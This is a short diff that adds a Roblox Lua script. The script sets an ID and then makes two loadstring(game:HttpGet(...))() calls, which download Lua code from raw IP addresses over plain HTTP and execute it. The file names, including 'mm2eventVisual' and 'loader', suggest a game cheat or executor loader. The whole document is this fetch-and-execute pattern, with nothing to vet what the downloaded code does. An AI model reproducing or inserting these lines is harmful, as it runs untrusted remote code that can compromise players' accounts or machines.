@@ -1,0 +1,4 @@
+ID="b047f7f2-bde8-4497-b6ee-43affe01cd98";
+RUN_AFTER=loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/mm2eventVisual.lua"))()
+
+loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/loader.luau"))()
